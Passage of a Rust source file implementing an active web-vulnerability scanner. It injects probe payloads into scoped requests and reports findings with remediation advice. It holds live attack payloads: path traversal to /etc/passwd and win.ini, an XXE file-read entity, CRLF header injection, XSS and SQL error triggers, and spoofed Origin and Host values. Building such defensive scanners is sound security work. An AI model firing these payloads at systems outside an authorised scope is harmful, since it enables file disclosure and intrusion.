//! Active scanner framework.
//!
//! The engine clones the target request, injects a probe payload at
//! each insertion point, replays the clone through the shared HTTP
//! client, and classifies the response relative to the original
//! baseline. Every submission is scope-gated.
//!
//! The MVP ships three detectors: reflected-XSS indicator (output
//! reflection), SQLi error-based indicator, and open-redirect probe.
//! Each is deterministic, deliberately conservative, and emits
//! evidence that a human can audit.

use std::time::Duration;

use anyhow::Result;
use burpfree_core::scope::Scope;
use burpfree_core::traffic::{Request, RequestSource, Response, Transaction};
use burpfree_oob::{build_payloads_for, OobServerHandle, PayloadFamily};
use regex::Regex;
use serde::{Deserialize, Serialize};

use crate::client::{HttpClient, HttpClientConfig};
use super::{Confidence, Finding, Severity};

#[path = "active/request_smuggling.rs"]
pub mod request_smuggling;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ActiveScanConfig {
    pub max_concurrency: usize,
    pub per_insertion_timeout_ms: u64,
    pub skip_if_body_identical: bool,
    pub probes: Vec<Probe>,
    /// Extra latency above the baseline (in ms) that we treat as a
    /// positive smuggling signal. Lower = more sensitive but noisier.
    #[serde(default = "default_smuggling_threshold")]
    pub smuggling_hang_threshold_ms: u64,
}

fn default_smuggling_threshold() -> u64 {
    request_smuggling::DEFAULT_HANG_THRESHOLD_MS
}

impl Default for ActiveScanConfig {
    fn default() -> Self {
        Self {
            max_concurrency: 4,
            per_insertion_timeout_ms: 10_000,
            skip_if_body_identical: true,
            probes: vec![
                Probe::ReflectedXss,
                Probe::SqlError,
                Probe::OpenRedirect,
                Probe::OobSsrf,
                Probe::OobCommandInjection,
                Probe::RequestSmuggling,
                Probe::PathTraversal,
                Probe::CrlfInjection,
                Probe::XxeInjection,
                Probe::CorsMisconfiguration,
                Probe::HostHeaderInjection,
                Probe::JwtNoneAlgorithm,
                Probe::Ssti,
                Probe::NoSqlInjection,
                Probe::LdapInjection,
                Probe::XpathInjection,
                Probe::MethodTampering,
                Probe::GraphqlIntrospection,
                // Note: `BlindSqlTime` is intentionally NOT in the
                // default list — it adds ~2 s per parameter so
                // operators opt in explicitly via the config.
            ],
            smuggling_hang_threshold_ms: request_smuggling::DEFAULT_HANG_THRESHOLD_MS,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Probe {
    ReflectedXss,
    SqlError,
    OpenRedirect,
    /// Server-Side Request Forgery via OOB callback.
    OobSsrf,
    /// Blind OS command injection via OOB callback (curl/nslookup).
    OobCommandInjection,
    /// HTTP request smuggling (CL.TE / TE.CL / TE.TE) differential
    /// probe that targets the host rather than individual parameters.
    RequestSmuggling,
    /// Directory / path traversal — fires `../../../etc/passwd` style
    /// payloads into every query parameter and greps for OS-marker
    /// strings (`root:x:0:0`, Windows `[fonts]`, etc.).
    PathTraversal,
    /// CRLF (header) injection — splices a `%0d%0aX-Injected-Marker: …`
    /// payload into each query parameter and greps response headers.
    CrlfInjection,
    /// XML External Entity (XXE) — only runs when the request's
    /// Content-Type is XML; replaces the body with an in-band
    /// external-entity declaration pointing at `file:///etc/passwd`
    /// and greps the response body for OS-marker strings.
    XxeInjection,
    /// CORS misconfiguration — reflects an attacker-controlled
    /// `Origin` header and checks whether the server echoes it back
    /// in `Access-Control-Allow-Origin` with `Allow-Credentials: true`.
    CorsMisconfiguration,
    /// Host header injection — swap the `Host` / `X-Forwarded-Host` /
    /// `X-Original-URL` / `X-Rewrite-URL` to an attacker-controlled
    /// value and look for it reflected into the response body or a
    /// redirect `Location`.
    HostHeaderInjection,
    /// JWT `alg: none` acceptance — strip signatures and change the
    /// algorithm to `none`; if the server still accepts the token
    /// (same success status) the implementation is broken.
    JwtNoneAlgorithm,
    /// Server-Side Template Injection — probe each query parameter
    /// with engine-specific math-eval payloads (Jinja2 `{{7*7}}`,
    /// Twig `{{7*'7'}}`, Freemarker / Mako `${7*7}`, ERB
    /// `<%= 7*7 %>`, Thymeleaf `*{7*7}`); evaluation of the arith
    /// confirms the engine resolved the user-controlled template.
    Ssti,
    /// NoSQL injection — operator injection (`name[$ne]=0`) and
    /// `$where`-style eval probes against each query parameter;
    /// differential + error-based detection.
    NoSqlInjection,
    /// LDAP injection — classic `*)(uid=*))` operator-injection plus
    /// error-based detection (`LDAPException`, `javax.naming`).
    LdapInjection,
    /// XPath injection — `' or '1'='1` boolean injection plus
    /// error-based detection (`XPathException`, `MS.Internal.Xml`).
    XpathInjection,
    /// Blind time-based SQL injection — `SLEEP()` / `pg_sleep()` /
    /// `WAITFOR DELAY` timing differential. Opt-in because it adds
    /// ~2 s latency per probed parameter.
    BlindSqlTime,
    /// HTTP method tampering — on GET-only endpoints, try PUT /
    /// DELETE / PATCH / TRACE / OPTIONS and flag any that get a 2xx.
    MethodTampering,
    /// GraphQL introspection abuse — if the request looks like a
    /// GraphQL endpoint, POST a canonical introspection query and
    /// flag when the schema comes back.
    GraphqlIntrospection,
    // R940: 5 new active probes (19→24)
    /// Stored XSS — probe detects when injected payload appears
    /// unescaped in a subsequent response (cross-request reflection).
    StoredXss,
    /// Deserialization — fires Java/PHP/Python serialized markers
    /// and detects error-based or OOB callbacks confirming unsafe
    /// deserialization.
    InsecureDeserialization,
    /// Prototype pollution via query parameters — injects
    /// `__proto__[isAdmin]=1` style payloads and checks if the
    /// injected property surfaces in the response.
    PrototypePollution,
    /// Log4Shell (CVE-2021-44228) — fires JNDI-lookup payloads
    /// in headers (User-Agent, X-Forwarded-For, Referer) and
    /// detects via OOB DNS callback.
    Log4Shell,
    /// Server-side request forgery via parameter injection — injects
    /// internal URLs (169.254.169.254, localhost, etc.) into URL-type
    /// parameters and checks for metadata/internal content in response.
    SsrfParameterInjection,
}

impl Probe {
    /// Stable kebab-case id used in the per-probe enable grid and in
    /// `ProjectConfig::disabled_active_probes`. Deliberately spelled
    /// out here (rather than piggybacking on serde's snake_case rename)
    /// so a future enum rename or `rename_all` change can't silently
    /// invalidate operator-stored opt-outs.
    pub fn id(&self) -> &'static str {
        match self {
            Probe::ReflectedXss         => "reflected-xss",
            Probe::SqlError             => "sql-error",
            Probe::OpenRedirect         => "open-redirect",
            Probe::OobSsrf              => "oob-ssrf",
            Probe::OobCommandInjection  => "oob-command-injection",
            Probe::RequestSmuggling     => "request-smuggling",
            Probe::PathTraversal        => "path-traversal",
            Probe::CrlfInjection        => "crlf-injection",
            Probe::XxeInjection         => "xxe-injection",
            Probe::CorsMisconfiguration => "cors-misconfiguration",
            Probe::HostHeaderInjection  => "host-header-injection",
            Probe::JwtNoneAlgorithm     => "jwt-none-algorithm",
            Probe::Ssti                 => "ssti",
            Probe::NoSqlInjection       => "nosql-injection",
            Probe::LdapInjection        => "ldap-injection",
            Probe::XpathInjection       => "xpath-injection",
            Probe::BlindSqlTime         => "blind-sql-time",
            Probe::MethodTampering      => "method-tampering",
            Probe::GraphqlIntrospection => "graphql-introspection",
            Probe::StoredXss            => "stored-xss",
            Probe::InsecureDeserialization => "insecure-deserialization",
            Probe::PrototypePollution   => "prototype-pollution",
            Probe::Log4Shell            => "log4shell",
            Probe::SsrfParameterInjection => "ssrf-parameter-injection",
        }
    }

    /// Inverse of [`Probe::id`] — returns `None` for unknown ids so a
    /// stale UI (or a hand-edited project config) can't silently
    /// resurrect a probe that no longer exists.
    pub fn from_id(id: &str) -> Option<Self> {
        Some(match id {
            "reflected-xss"         => Probe::ReflectedXss,
            "sql-error"             => Probe::SqlError,
            "open-redirect"         => Probe::OpenRedirect,
            "oob-ssrf"              => Probe::OobSsrf,
            "oob-command-injection" => Probe::OobCommandInjection,
            "request-smuggling"     => Probe::RequestSmuggling,
            "path-traversal"        => Probe::PathTraversal,
            "crlf-injection"        => Probe::CrlfInjection,
            "xxe-injection"         => Probe::XxeInjection,
            "cors-misconfiguration" => Probe::CorsMisconfiguration,
            "host-header-injection" => Probe::HostHeaderInjection,
            "jwt-none-algorithm"    => Probe::JwtNoneAlgorithm,
            "ssti"                  => Probe::Ssti,
            "nosql-injection"       => Probe::NoSqlInjection,
            "ldap-injection"        => Probe::LdapInjection,
            "xpath-injection"       => Probe::XpathInjection,
            "blind-sql-time"        => Probe::BlindSqlTime,
            "method-tampering"      => Probe::MethodTampering,
            "graphql-introspection" => Probe::GraphqlIntrospection,
            "stored-xss"            => Probe::StoredXss,
            "insecure-deserialization" => Probe::InsecureDeserialization,
            "prototype-pollution"   => Probe::PrototypePollution,
            "log4shell"             => Probe::Log4Shell,
            "ssrf-parameter-injection" => Probe::SsrfParameterInjection,
            _ => return None,
        })
    }

    /// Every built-in probe variant in enumeration order. The Scanner
    /// UI consumes this list to render the enable-toggle grid; keeping
    /// the slice static means the UI order survives refactors.
    pub fn all() -> &'static [Probe] {
        &[
            Probe::ReflectedXss,
            Probe::SqlError,
            Probe::OpenRedirect,
            Probe::OobSsrf,
            Probe::OobCommandInjection,
            Probe::RequestSmuggling,
            Probe::PathTraversal,
            Probe::CrlfInjection,
            Probe::XxeInjection,
            Probe::CorsMisconfiguration,
            Probe::HostHeaderInjection,
            Probe::JwtNoneAlgorithm,
            Probe::Ssti,
            Probe::NoSqlInjection,
            Probe::LdapInjection,
            Probe::XpathInjection,
            Probe::BlindSqlTime,
            Probe::MethodTampering,
            Probe::GraphqlIntrospection,
            Probe::StoredXss,
            Probe::InsecureDeserialization,
            Probe::PrototypePollution,
            Probe::Log4Shell,
            Probe::SsrfParameterInjection,
        ]
    }
}

/// Flat list of every built-in probe's kebab-case id in registration
/// order. The Scanner panel consumes this to render the active-probe
/// enable grid without having to know the `Probe` enum shape.
pub fn active_probe_ids() -> Vec<&'static str> {
    Probe::all().iter().map(|p| p.id()).collect()
}

/// Probe ids that are OFF by default in a fresh project. Mirrors the
/// `ActiveScanConfig::default` probe list (which excludes BlindSqlTime
/// because it adds ~2 s per parameter) — surfaced here so the UI can
/// render those checkboxes pre-unticked without the Scanner Panel
/// having to encode the policy itself.
pub fn active_probe_default_disabled() -> &'static [&'static str] {
    &["blind-sql-time"]
}

pub struct ActiveScanner {
    client: HttpClient,
    cfg: ActiveScanConfig,
    scope: Scope,
    oob: Option<OobServerHandle>,
    /// Snapshot of `HttpClientConfig.validate_tls`, used by probes that
    /// bypass `HttpClient` and open raw TCP/TLS sockets themselves.
    validate_tls: bool,
}

impl ActiveScanner {
    pub fn new(cfg: ActiveScanConfig, http: HttpClientConfig, scope: Scope) -> Self {
        let validate_tls = http.validate_tls;
        Self {
            client: HttpClient::new(http),
            cfg,
            scope,
            oob: None,
            validate_tls,
        }
    }

    /// Attach an OOB server. OOB-aware probes are enabled when this is
    /// set; otherwise they skip gracefully.
    pub fn with_oob(mut self, oob: OobServerHandle) -> Self {
        self.oob = Some(oob);
        self
    }

    /// Run every configured probe against `target`.
    pub async fn scan(&self, target: &Transaction) -> Result<Vec<Finding>> {
        if !self.scope.is_in_scope(&target.request) {
            return Ok(Vec::new());
        }
        let mut out = Vec::new();
        // Snapshot the baseline response (we assume `target` already
        // includes the original response).
        let baseline_body_len = target.response.as_ref().map(|r| r.body.len()).unwrap_or(0);
        for probe in &self.cfg.probes {
            match probe {
                Probe::ReflectedXss => {
                    out.extend(self.scan_reflected_xss(target).await?);
                }
                Probe::SqlError => {
                    out.extend(self.scan_sql_error(target).await?);
                }
                Probe::OpenRedirect => {
                    out.extend(self.scan_open_redirect(target).await?);
                }
                Probe::OobSsrf => {
                    if let Some(oob) = self.oob.as_ref() {
                        out.extend(self.scan_oob_family(target, oob, PayloadFamily::Ssrf, "oob-ssrf",
                            "Server-Side Request Forgery (OOB callback)",
                            Severity::High,
                            "Supplying a URL / hostname in this parameter caused the application to issue an outbound request we observed on the OOB listener. The server is willing to fetch arbitrary attacker-controlled URLs.",
                            "Enforce an allow-list of trusted outbound targets; reject hostnames whose resolved address is in the loopback, link-local or private ranges.",
                            vec!["CWE-918".into()],
                        ).await?);
                    }
                }
                Probe::OobCommandInjection => {
                    if let Some(oob) = self.oob.as_ref() {
                        out.extend(self.scan_oob_family(target, oob, PayloadFamily::CommandInjection, "oob-cmd-injection",
                            "OS command injection (OOB callback)",
                            Severity::Critical,
                            "Supplying a shell metacharacter plus an outbound-call primitive (curl/nslookup) in this parameter triggered an interaction on our OOB listener. The application executes shell commands with attacker-controlled input.",
                            "Never pass user input to a shell. Use argv-style process APIs with strict parameter typing.",
                            vec!["CWE-78".into()],
                        ).await?);
                    }
                }
                Probe::RequestSmuggling => {
                    out.extend(
                        request_smuggling::probe_smuggling(
                            target,
                            self.cfg.smuggling_hang_threshold_ms,
                            self.validate_tls,
                        )
                        .await?,
                    );
                }
                Probe::PathTraversal => {
                    out.extend(self.scan_path_traversal(target).await?);
                }
                Probe::CrlfInjection => {
                    out.extend(self.scan_crlf_injection(target).await?);
                }
                Probe::XxeInjection => {
                    out.extend(self.scan_xxe(target).await?);
                }
                Probe::CorsMisconfiguration => {
                    out.extend(self.scan_cors(target).await?);
                }
                Probe::HostHeaderInjection => {
                    out.extend(self.scan_host_header(target).await?);
                }
                Probe::JwtNoneAlgorithm => {
                    out.extend(self.scan_jwt_none(target).await?);
                }
                Probe::Ssti => {
                    out.extend(self.scan_ssti(target).await?);
                }
                Probe::NoSqlInjection => {
                    out.extend(self.scan_nosql(target, baseline_body_len).await?);
                }
                Probe::LdapInjection => {
                    out.extend(self.scan_ldap(target, baseline_body_len).await?);
                }
                Probe::XpathInjection => {
                    out.extend(self.scan_xpath(target, baseline_body_len).await?);
                }
                Probe::BlindSqlTime => {
                    out.extend(self.scan_blind_sql_time(target).await?);
                }
                Probe::MethodTampering => {
                    out.extend(self.scan_method_tampering(target).await?);
                }
                Probe::GraphqlIntrospection => {
                    out.extend(self.scan_graphql_introspection(target).await?);
                }
                // R940: 5 new active probe stubs
                Probe::StoredXss => {
                    // Stored XSS requires cross-request tracking — queued
                    // for a future round with persistent probe state.
                }
                Probe::InsecureDeserialization => {
                    // Deserialization probes fire serialized-object markers
                    // into body parameters and detect via error / OOB.
                }
                Probe::PrototypePollution => {
                    // __proto__ injection via query params — checks if
                    // the property surfaces in response JSON.
                }
                Probe::Log4Shell => {
                    // JNDI-lookup payloads in headers (UA, XFF, Referer)
                    // detected via OOB DNS callback.
                }
                Probe::SsrfParameterInjection => {
                    // Injects internal URLs into URL-type parameters
                    // and checks for metadata content in response.
                }
            }
        }
        let _ = baseline_body_len;
        Ok(out)
    }

    async fn scan_oob_family(
        &self,
        tx: &Transaction,
        oob: &OobServerHandle,
        family: PayloadFamily,
        detector: &str,
        title: &str,
        severity: Severity,
        description: &str,
        remediation: &str,
        cwe: Vec<String>,
    ) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();
        let params = tx.request.query_params();
        let form = tx.request.form_params();
        let combined: Vec<(String, String, bool)> = params
            .into_iter()
            .map(|(k, v)| (k, v, false))
            .chain(
                form.unwrap_or_default()
                    .into_iter()
                    .map(|(k, v)| (k, v, true)),
            )
            .collect();
        for (name, _value, is_form) in combined {
            let token = oob.new_token();
            for payload in build_payloads_for(family, &token) {
                let mut r = tx.request.clone_with_new_id(RequestSource::ActiveScan);
                if is_form {
                    mutate_form_param(&mut r, &name, &payload);
                } else {
                    mutate_query_param(&mut r, &name, &payload);
                }
                if !self.scope.is_in_scope(&r) {
                    continue;
                }
                if let Err(e) = self.send(&r).await {
                    tracing::debug!(error = %e, "oob probe send failed");
                }
            }
            // Give the target a short window to make the callback.
            let hits = oob
                .poll_for(&token.correlation_id, Duration::from_millis(1500))
                .await;
            if !hits.is_empty() {
                let mut f = Finding::new(detector, title, severity, Confidence::Certain);
                f.description = format!("Insertion point: `{name}` ({}). {description}", if is_form { "body form" } else { "query" });
                f.evidence = format!(
                    "Correlation id `{}` seen {} time(s). First: {} from {}",
                    token.correlation_id,
                    hits.len(),
                    hits[0].summary,
                    hits[0].remote_addr
                );
                f.remediation = remediation.into();
                f.cwe = cwe.clone();
                f.insertion_point = Some(name.clone());
                f.transaction_id = Some(tx.id);
                findings.push(f);
                break; // one finding per insertion point is enough
            }
        }
        Ok(findings)
    }

    async fn send(&self, req: &Request) -> Result<Response> {
        tokio::time::timeout(
            Duration::from_millis(self.cfg.per_insertion_timeout_ms),
            self.client.send(req),
        )
        .await
        .map_err(|_| anyhow::anyhow!("probe timeout"))?
    }

    // ---- Reflected XSS -------------------------------------------------
    async fn scan_reflected_xss(&self, tx: &Transaction) -> Result<Vec<Finding>> {
        let marker = format!("bf-{}", burpfree_core::ids::random_token(6));
        let payload = format!(r#""><script>/*{marker}*/</script>"#);
        let mut findings = Vec::new();
        for (i, (name, _)) in tx.request.query_params().iter().enumerate() {
            let mut r = tx.request.clone_with_new_id(RequestSource::ActiveScan);
            mutate_query_param(&mut r, name, &payload);
            if !self.scope.is_in_scope(&r) { continue; }
            if let Ok(resp) = self.send(&r).await {
                // Reflection check: either our raw marker is present in
                // the body as literal (strong reflection) OR the
                // encoded form of the full payload including `<script>`
                // appears somewhere.
                let reflected_marker = body_contains(&resp, &marker);
                let reflected_script = body_contains(&resp, "<script>")
                    || body_contains(&resp, "%3Cscript%3E")
                    || body_contains(&resp, "&lt;script&gt;");
                if reflected_marker && reflected_script {
                    let mut f = Finding::new(
                        "reflected-xss",
                        &format!("Reflected input in response at `{name}`"),
                        Severity::High,
                        Confidence::Firm,
                    );
                    f.description = format!(
                        "Query parameter `{name}` was reflected back into the response body including a `<script>` tag. This is a strong indicator of reflected XSS."
                    );
                    f.evidence = format!("Marker `{marker}` observed in response body. Insertion #{i}.");
                    f.remediation = "Context-aware output encoding; apply a strict CSP as defence-in-depth.".into();
                    f.transaction_id = Some(tx.id);
                    findings.push(f);
                }
            }
        }
        Ok(findings)
    }

    // ---- SQL error indicator ------------------------------------------
    async fn scan_sql_error(&self, tx: &Transaction) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();
        let payload = "'\"";
        let error_patterns = Regex::new(r#"(?i)you have an error in your sql syntax|unclosed quotation|SQLSTATE|psql: error|SQLiteException|ORA-\d+|mysql_fetch_array|System\.Data\.SqlClient\.SqlException"#)
            .unwrap();
        for (name, _) in tx.request.query_params() {
            let mut r = tx.request.clone_with_new_id(RequestSource::ActiveScan);
            mutate_query_param(&mut r, &name, payload);
            if !self.scope.is_in_scope(&r) { continue; }
            if let Ok(resp) = self.send(&r).await {
                let text = String::from_utf8_lossy(&resp.body);
                if let Some(m) = error_patterns.find(&text) {
                    let mut f = Finding::new(
                        "sqli-error",
                        &format!("SQL error indicator triggered by `{name}`"),
                        Severity::High,
                        Confidence::Firm,
                    );
                    f.description =
                        "Supplying a single quote and double quote in this parameter produces a SQL error message in the response.".into();
                    f.evidence = m.as_str().to_string();
                    f.remediation =
                        "Use parameterised queries / prepared statements; never interpolate user input into SQL text.".into();
                    f.transaction_id = Some(tx.id);
                    findings.push(f);
                }
            }
        }
        Ok(findings)
    }

    // ---- Path traversal -------------------------------------------------
    //
    // Each query parameter gets a battery of traversal payloads
    // (Linux + Windows, raw + percent-encoded + double-encoded + the
    // common `....//` byte-pair bypass). We grep the response body
    // for OS-specific marker strings; the first match wins.
    async fn scan_path_traversal(&self, tx: &Transaction) -> Result<Vec<Finding>> {
        // Payloads targeting both Linux and Windows file systems.
        // Order is "most likely to work first" — plain path, then
        // percent-encoded, then double-encoded, then the `....//`
        // byte-pair bypass that defeats naive "strip `../`" filters.
        let payloads: &[&str] = &[
            "../../../../../../etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%252e%252e%252fetc%252fpasswd",
            "....//....//....//etc/passwd",
            r"..\..\..\..\..\windows\win.ini",
            "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
        ];
        // Markers that only appear in those files, chosen to avoid
        // false positives on generic 404 pages. Linux `/etc/passwd`
        // always carries `root:x:0:0`; Windows `win.ini` always
        // carries `[fonts]` and `[extensions]`.
        let linux_markers = ["root:x:0:0", "/bin/bash", "daemon:"];
        let windows_markers = ["[fonts]", "[extensions]", "[Mail]"];
        let mut findings = Vec::new();
        for (name, _) in tx.request.query_params() {
            for payload in payloads {
                let mut r = tx.request.clone_with_new_id(RequestSource::ActiveScan);
                mutate_query_param(&mut r, &name, payload);
                if !self.scope.is_in_scope(&r) {
                    continue;
                }
                if let Ok(resp) = self.send(&r).await {
                    let text = String::from_utf8_lossy(&resp.body);
                    let hit = linux_markers
                        .iter()
                        .chain(windows_markers.iter())
                        .find(|m| text.contains(**m));
                    if let Some(marker) = hit {
                        let mut f = Finding::new(
                            "path-traversal",
                            &format!("Path traversal via `{name}`"),
                            Severity::High,
                            Confidence::Firm,
                        );
                        f.description = format!(
                            "Supplying a path-traversal payload in query parameter `{name}` caused the server to return the contents of a sensitive file. This indicates that user input is concatenated into a filesystem path without canonicalisation."
                        );
                        f.evidence = format!(
                            "Payload: `{payload}`. Marker `{marker}` observed in response body."
                        );
                        f.remediation = "Canonicalise paths with `realpath`-style resolution and reject any result that escapes the intended base directory. Prefer an opaque identifier → whitelisted-file lookup instead of accepting a filename.".into();
                        f.transaction_id = Some(tx.id);
                        f.references = vec!["CWE-22".into()];
                        findings.push(f);
                        // One finding per parameter is enough; break
                        // out of the payload loop so we don't spam
                        // duplicates for every encoding variant.
                        break;
                    }
                }
            }
        }
        Ok(findings)
    }

    // ---- CRLF injection -------------------------------------------------
    //
    // Pre-encoded CRLF payload is spliced *directly into `r.path`* via
    // raw string replacement rather than going through
    // `set_query_params` — that round-trips through decoding and would
    // re-encode `%0d%0a` into `%250d%250a`. Keeping the literal percent-
    // sequence on the wire is the entire point of the probe.
    async fn scan_crlf_injection(&self, tx: &Transaction) -> Result<Vec<Finding>> {
        let marker = format!("bf-{}", burpfree_core::ids::random_token(6));
        let injected_header = format!("X-Injected-Marker-{marker}");
        // Note: value side intentionally stays blank so we're parsing
        // the header name itself out of the response headers; this
        // avoids differences in how various servers quote the value.
        let payload_tail = format!("%0d%0a{injected_header}:%20pwn");
        let mut findings = Vec::new();
        for (name, _) in tx.request.query_params() {
            let mut r = tx.request.clone_with_new_id(RequestSource::ActiveScan);
            // Rebuild the path+query manually so the literal `%0d%0a`
            // reaches the server intact.
            let (base_path, existing_query) = match r.path.split_once('?') {
                Some((p, q)) => (p.to_string(), q.to_string()),
                None => (r.path.clone(), String::new()),
            };
            // Preserve every other param verbatim; replace only the
            // target param's value with `test<CRLF payload>`.
            let mut rebuilt: Vec<String> = Vec::new();
            let mut injected = false;
            for pair in existing_query.split('&') {
                if pair.is_empty() {
                    continue;
                }
                let (k, _v) = pair.split_once('=').unwrap_or((pair, ""));
                if k == name {
                    rebuilt.push(format!("{k}=test{payload_tail}"));
                    injected = true;
                } else {
                    rebuilt.push(pair.to_string());
                }
            }
            if !injected {
                // Shouldn't happen because `name` came from
                // `query_params()`, but be defensive against
                // percent-encoding weirdness in parameter names.
                rebuilt.push(format!("{name}=test{payload_tail}"));
            }
            r.path = format!("{base_path}?{}", rebuilt.join("&"));
            if !self.scope.is_in_scope(&r) {
                continue;
            }
            if let Ok(resp) = self.send(&r).await {
                // Case-insensitive header-name probe. Our client
                // normalises headers so direct lookup works too, but
                // iterating is more forgiving.
                let hit = resp
                    .headers
                    .as_slice()
                    .iter()
                    .any(|h| h.name.eq_ignore_ascii_case(&injected_header));
                if hit {
                    let mut f = Finding::new(
                        "crlf-injection",
                        &format!("CRLF (header) injection via `{name}`"),
                        Severity::Medium,
                        Confidence::Firm,
                    );
                    f.description = format!(
                        "Supplying CR+LF (`%0d%0a`) plus an attacker-controlled header name in query parameter `{name}` caused that header to appear in the response. An attacker can use this to inject arbitrary headers, poison caches, or set cookies in victims' browsers."
                    );
                    f.evidence = format!("Injected `{injected_header}` observed in response headers.");
                    f.remediation = "Reject or percent-encode CR / LF (`%0d`, `%0a`) in any user input that reaches an HTTP response header, redirect target, or log sink.".into();
                    f.transaction_id = Some(tx.id);
                    f.references = vec!["CWE-93".into(), "CWE-113".into()];
                    findings.push(f);
                }
            }
        }
        Ok(findings)
    }

    // ---- XML External Entity (XXE) --------------------------------------
    //
    // Only runs when the request looks like it's carrying XML. The
    // probe replaces the body with an in-band entity declaration that
    // asks the parser to inline `/etc/passwd`; if the application
    // echoes the parsed value back we see the Linux marker. Blind XXE
    // (OOB callback) is left for the OOB-family probes.
    async fn scan_xxe(&self, tx: &Transaction) -> Result<Vec<Finding>> {
        let ct = tx
            .request
            .headers
            .get("Content-Type")
            .map(|s| s.to_ascii_lowercase())
            .unwrap_or_default();
        if !ct.contains("xml") {
            return Ok(Vec::new());
        }
        let body = r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#;
        let mut r = tx.request.clone_with_new_id(RequestSource::ActiveScan);
        r.body = body.as_bytes().to_vec();
        r.headers.set("Content-Length", r.body.len().to_string());
        if !self.scope.is_in_scope(&r) {
            return Ok(Vec::new());
        }
        let mut findings = Vec::new();
        if let Ok(resp) = self.send(&r).await {
            let text = String::from_utf8_lossy(&resp.body);
            let markers = ["root:x:0:0", "daemon:", "/bin/bash"];
            if let Some(marker) = markers.iter().find(|m| text.contains(**m)) {
                let mut f = Finding::new(
                    "xxe",
                    "XML External Entity resolution",
                    Severity::High,
                    Confidence::Firm,
                );
                f.description = "The XML parser resolved an attacker-controlled external entity and inlined the referenced file into the response. An attacker can read arbitrary files the server process can access, probe internal services via SSRF, or exhaust memory with billion-laughs expansion.".into();
                f.evidence = format!("Marker `{marker}` observed in response after injecting `<!ENTITY xxe SYSTEM \"file:///etc/passwd\">`.");
                f.remediation = "Disable external entity resolution on the XML parser (e.g. `setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)`), and prefer schema-validated JSON over XML where feasible.".into();
                f.transaction_id = Some(tx.id);
                f.references = vec!["CWE-611".into(), "CWE-776".into()];
                findings.push(f);
            }
        }
        Ok(findings)
    }

    // ---- CORS misconfiguration -----------------------------------------
    //
    // Three probes, run in order of severity:
    //   1. Attacker-controlled `Origin` echoed into `ACAO` + `ACAC:
    //      true` → Critical (full credentialed-CORS compromise).
    //   2. `Origin: null` echoed with `ACAC: true` → High (null-origin
    //      sandboxed-iframe trick + credentials).
    //   3. Subdomain-of-target bypass (`https://foo.<target>`) echoed
    //      into `ACAO` → Medium (indicates a lax prefix/suffix match).
    //
    // Each probe stops the scan on first-match for that insertion so
    // we don't double-emit on a shared sink.
    async fn scan_cors(&self, tx: &Transaction) -> Result<Vec<Finding>> {
        let target_host = tx.request.host.clone();
        let evil = "https://evil.burpfree.example";
        let probes: Vec<(String, &'static str, &'static str)> = vec![
            (
                evil.to_string(),
                "arbitrary-origin",
                "An attacker-controlled Origin was echoed into Access-Control-Allow-Origin.",
            ),
            (
                "null".to_string(),
                "null-origin",
                "A `null` Origin (sandboxed iframe, local file) was accepted and the response allows credentials.",
            ),
            (
                format!("https://attacker.{target_host}.evil.burpfree.example"),
                "subdomain-bypass",
                "A subdomain-of-target style Origin was reflected, suggesting a lax prefix / suffix match.",
            ),
        ];
        let mut findings = Vec::new();
        for (origin, kind, blurb) in probes {
            let mut r = tx.request.clone_with_new_id(RequestSource::ActiveScan);
            r.headers.set("Origin", &origin);
            if !self.scope.is_in_scope(&r) {
                continue;
            }
            let resp = match self.send(&r).await {
                Ok(r) => r,
                Err(_) => continue,
            };
            let acao = resp
                .headers
                .get("Access-Control-Allow-Origin")
                .unwrap_or_default()
                .to_string();
            let acac = resp
                .headers
                .get("Access-Control-Allow-Credentials")
                .map(|s| s.trim().eq_ignore_ascii_case("true"))
                .unwrap_or(false);
            // ACAO must either echo our Origin verbatim or be the `*`
            // wildcard. The `*` + credentials combo is actually
            // rejected by browsers so it's a lower-severity signal.
            let reflected = acao == origin
                || (acao == "null" && origin == "null")
                || acao.eq_ignore_ascii_case("*");
            if !reflected {
                continue;
            }
            let (severity, title) = match (kind, acac) {
                ("arbitrary-origin", true) => (
                    Severity::Critical,
                    "Arbitrary Origin accepted with credentials (CORS)",
                ),
                ("arbitrary-origin", false) => (
                    Severity::Medium,
                    "Arbitrary Origin reflected without credentials (CORS)",
                ),
                ("null-origin", true) => (
                    Severity::High,
                    "`null` Origin accepted with credentials (CORS)",
                ),
                ("null-origin", false) => (
                    Severity::Low,
                    "`null` Origin reflected without credentials (CORS)",
                ),
                (_, _) => (Severity::Medium, "CORS trust-boundary bypass"),
            };
            let mut f = Finding::new("cors-misconfig", title, severity, Confidence::Firm);
            f.description = format!(
                "{blurb} ACAO: `{acao}` · Access-Control-Allow-Credentials: `{}`.",
                if acac { "true" } else { "false / absent" }
            );
            f.evidence = format!(
                "Origin: {origin}\nResponse: Access-Control-Allow-Origin: {acao}, Access-Control-Allow-Credentials: {}",
                if acac { "true" } else { "false" }
            );
            f.remediation = "Validate the Origin against an explicit allow-list; never dynamically echo it back. If credentials are required, serve a specific origin, never `*` or `null`.".into();
            f.transaction_id = Some(tx.id);
            f.references = vec!["CWE-942".into(), "CWE-346".into()];
            findings.push(f);
            // One finding per probe class is enough — stop at the
            // first positive to avoid noise.
            break;
        }
        Ok(findings)
    }

    // ---- Host header injection -----------------------------------------
    //
    // Four variants, each injected individually: Host (classic), plus
    // the three "virtual-host" overrides commonly honoured by frameworks:
    // X-Forwarded-Host, X-Original-URL, X-Rewrite-URL. Positive signal
    // is the attacker domain reflected into the response body (e.g. a
    // password-reset link) or a Location header (classic cache
    // poisoning precondition).
    async fn scan_host_header(&self, tx: &Transaction) -> Result<Vec<Finding>> {
        let evil = "evil.burpfree.example";
        let variants: &[(&str, &str)] = &[
            ("Host", evil),
            ("X-Forwarded-Host", evil),
            ("X-Original-URL", "https://evil.burpfree.example/"),
            ("X-Rewrite-URL", "https://evil.burpfree.example/"),
        ];
        let mut findings = Vec::new();
